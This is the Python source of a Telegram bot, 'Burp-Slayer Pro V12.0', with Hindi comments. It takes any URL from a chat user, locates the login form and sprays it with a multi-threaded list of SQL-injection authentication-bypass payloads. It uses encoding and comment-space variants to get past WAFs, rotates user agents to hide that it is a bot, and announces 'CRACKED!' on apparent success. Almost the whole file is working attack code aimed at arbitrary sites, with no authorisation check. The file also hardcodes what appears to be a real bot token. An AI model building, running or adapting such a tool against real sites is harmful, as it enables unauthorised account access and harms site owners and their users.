import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
import urllib.parse
from flask import Flask
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Flask Server for Render
app = Flask('')
@app.route('/')
def home(): return "Burp-Slayer Pro V12.0 Active!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# ब्राउज़र लिस्ट ताकि वेबसाइट पहचान न सके कि यह बोट है
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# एडवांस पेलोड्स लाइब्रेरी
SQL_ADVANCED = [
    "' OR 1=1--", "admin' --", "admin' #", "' OR 1=1 LIMIT 1--", 
    "admin' OR '1'='1'--", "') OR ('1'='1", "' OR SLEEP(5)--",
    "admin'/*", "' or ''='", "admin\" or 1=1--", "' OR 1=1#"
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🚀 **Ultimate Burp-Slayer V12.0**\n\n- Multi-threading: `Enabled`\n- WAF Bypass: `Enabled`\n- Proxy Logic: `Active`\n\nURL भेजें।")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def start_attack(message):
    target_url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 एनालिसिस शुरू... (Proxy & Header Setup)")

    session = requests.Session()
    try:
        # बेसलाइन डेटा
        res = session.get(target_url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
        base_len = len(res.text)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.edit_message_text("❌ फॉर्म नहीं मिला।", chat_id, status_msg.message_id)
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        found_info = {"success": False}

        # मल्टी-थ्रेडेड अटैक (एक साथ 10 थ्रेड्स)
        with ThreadPoolExecutor(max_workers=10) as executor:
            for p in SQL_ADVANCED:
                if found_info["success"]: break
                executor.submit(attack_worker, target_url, user_key, pass_key, p, base_len, chat_id, found_info)

        if not found_info["success"]:
            bot.send_message(chat_id, "🤖 लाइब्रेरी खत्म। अब AI रैंडम पेलोड्स के साथ हमला जारी है...")
            # AI Loop... (Infinite)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

def attack_worker(url, u_key, p_key, p, base_len, chat_id, found_info):
    if found_info["success"]: return
    
    # पेलोड म्यूटेशन (Encoding bypass)
    variants = [p, urllib.parse.quote(p), p.replace(" ", "/**/")]
    
    for variant in variants:
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            # प्रॉक्सी यहाँ जोड़ सकते हैं: proxies = {'http': 'ip:port'}
            
            start_t = time.time()
            # 'admin' और 'payload' दोनों कॉम्बिनेशन चेक करना
            payload_data = {u_key: variant, p_key: variant}
            r = requests.post(url, data=payload_data, headers=headers, timeout=10, allow_redirects=True)
            duration = time.time() - start_t

            # SUCCESS DETECTION LOGIC
            if (duration > 4 and "SLEEP" in p.upper()) or \
               abs(len(r.text) - base_len) > 100 or \
               any(word in r.text.lower() for word in ["logout", "dashboard", "welcome"]):
                
                found_info["success"] = True
                bot.send_message(chat_id, f"🔥 **CRACKED!** 🔥\n\n✅ SQL: `{variant}`\n✅ Status: Success\n✅ Length Diff: `{abs(len(r.text) - base_len)}`")
                return
        except: pass

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
